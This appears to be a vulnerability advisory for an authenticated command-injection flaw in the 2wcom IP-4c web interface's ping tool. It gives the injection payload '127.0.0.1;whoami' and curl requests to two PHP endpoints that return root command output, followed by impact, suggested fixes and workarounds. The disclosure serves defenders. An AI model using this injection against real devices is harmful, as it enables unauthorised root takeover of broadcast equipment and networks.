# 2wcom IP-4c - Remote Code Execution (RCE)

## Description
The 2wcom IP-4c web interface allows an authenticated attacker to perform Remote Code Execution via command injection in the ping tool configuration. This is due to improper input sanitization in the `Destination` field, which is executed directly in the system shell.

---

## Vendor Information

- **Vendor**: 2wcom  
- **Vendor Homepage**: https://www.2wcom.com/

## Product
- **Name**: 2wcom IP-4c
- **Firmware/Software Versions**:
  - **Bundle version**: 2.15.5
  - **File/Recovery system version**: 2.78 / 2.02
  - **App version**: 2.15.16
  - **Webinterface version**: 3.54
  - **FPGA version**: 1.12b64 / 0
  - **System controller version**: 1.07
  - **SNMP MIB version**: 4.4
  - **Kernel version**: 2wcom-01.25-rt60
  - **Codec versions**:
    - MP2 encoder: 1.5.0
    - MP2 decoder: 2.3.0
    - MP3 encoder: 5.12.1
    - MP3 decoder: 5.6.0
    - AAC encoder: 3.10.0
    - xHE-AAC encoder: 04.05.04
    - AAC decoder: 2.12.1
    - Opus: 1.5.2
    - E-aptX: 1.7
  - **HW revision XPS/IF**: 1.02 / 1.10

---

## Vulnerability Type
- Remote Code Execution (Authenticated)

## Attack Vector
- Network (Web Interface)


---


## Vulnerable Endpoints
- `/cwi/ajax_request/get_data.php?store=1`
- `/cwi/ajax_request/check_ping.php`
- `/#tcpip` (via web interface’s Tools > Ping)

---

## Exploitation

### Exploit via Web Interface
1. Login as admin.
2. Go to: `/#tcpip`  
   → Tools  
   → Ping
3. Set `Destination` to:
```bash
127.0.0.1;whoami
```
4. Set `Count` to `1` and start the ping.
5. The response will contain the output of the `whoami` command.

### Exploit via API (cURL Example)
1. Send the command injection using:
```bash
curl 'http://<target>/cwi/ajax_request/get_data.php?store=1' \
  -X POST \
  -H 'Cookie: PHPSESSID=<session>; other-cookies...' \
  --data-raw 'CSRFName=CSRFGuard_<id>&CSRFToken=<token>&set%3Acsl-interface-tools-ping-destination=127.0.0.1%3Bwhoami&set%3Acsl-interface-tools-ping-ifIndex=0&set%3Acsl-interface-tools-ping-ifIndexVlan=0&set%3Acsl-interface-tools-ping-count=1&set%3Acsl-interface-tools-ping-ttl=255&set%3Acsl-interface-tools-ping-dataSize=0'
```
2. Check the result with:
```bash 
curl 'http://<target>/cwi/ajax_request/check_ping.php' -X POST -H 'Cookie: PHPSESSID=<session>; other-cookies...' -H 'Content-Length: 0'
```
The response will contain command output:
```bash
uid=0(root) gid=0(root)
```
---

## Proof of Concept (PoC) for(RCE,Information Disclosure,Broken Access Control)
https://github.com/user-attachments/assets/42bc93b9-cc75-47bf-bae4-e33f6f87a3ce

---

## Impact 
 * Full system compromise as root 
 * Remote execution of arbitrary commands 
 * Potential to pivot within the network

---

## Suggested Fixes

  * Sanitize user inputs in ping tool configuration (block ;, &&, |, etc.)

  * Use safe API calls instead of direct shell execution

  * Implement strict role-based access controls

---

## Workarounds

  * Restrict access to /cwi/ajax_request/* endpoints using firewall rules or VPN

  * Monitor system logs for suspicious ping tool usage
